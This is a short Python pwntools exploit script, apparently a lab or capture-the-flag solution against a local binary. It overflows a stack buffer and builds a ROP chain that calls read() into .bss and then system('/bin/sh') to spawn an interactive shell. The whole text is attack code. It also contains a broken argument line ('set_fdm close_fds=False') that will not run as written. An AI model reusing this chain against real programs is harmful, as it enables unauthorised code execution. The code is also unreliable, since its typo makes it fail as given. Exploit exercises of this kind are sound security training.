import os
from pwn import *

def set_fd():
    os.dup2(0, 3)
    
with open("/etc/passwd", "r") as f:
    size_etcpasswd = len(f.read())
    
system = 0x8049090
read = 0x8049050
lr = 0x804935d
bss = 0x804c800

fname = "/home/lab07/fd/target"
p = process([fname], preexec_fn=set_fdm close_fds=False)

# payload = cyclic(size_etcpasswd+0x100)
payload = cyclic(cyclic_find(0x61627962))
payload += p32(bss)
payload += p32(read)
payload += p32(lr)
payload += p32(0)
payload += p32(bss+4)
payload += p32(0x1000)
p.send(payload)

payload = p32(system)
payload += p32(0xcafebabe)
payload += p32(bss+0x10)
payload += b"/bin/sh\x00"
p.send(payload)

p.interactive()